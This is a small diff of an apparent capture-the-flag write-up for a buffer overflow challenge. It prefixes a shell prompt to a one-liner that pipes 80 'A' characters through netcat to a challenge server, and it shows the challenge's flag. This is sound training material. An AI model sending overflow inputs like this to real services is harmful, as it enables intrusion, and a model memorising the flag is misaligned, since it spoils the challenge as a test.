@@ -39,6 +39,6 @@ $ ./bof < temp
 
 exploit:
 ```
-python -c "print 'A'*80" | nc imaginary.ml 10002
+$ python -c "print 'A'*80" | nc imaginary.ml 10002
 
 Flag: `flag{buff3r_0v3rfl0w_1s_d4ng3r0uS}`
